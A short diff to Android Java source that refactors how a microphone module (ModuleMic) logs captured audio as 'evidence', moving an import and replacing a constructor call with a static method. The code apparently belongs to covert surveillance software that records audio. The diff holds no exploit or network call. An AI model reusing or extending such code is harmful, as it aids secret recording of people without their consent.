@@ -20,13 +20,13 @@ import android.net.LocalSocket;
 import android.net.LocalSocketAddress;
 
 import com.android.networking.Call;
-import com.android.networking.LogR;
 import com.android.networking.Messages;
 import com.android.networking.StateRun;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.file.AutoFile;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerCall;
@@ -288,7 +288,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 
 			if (data.length > 0) {
-				new LogR(EvidenceType.MIC, getAdditionalData(), data);
+				LogR.atomic(EvidenceType.MIC, getAdditionalData(), data);
 			}
 
 		} else {
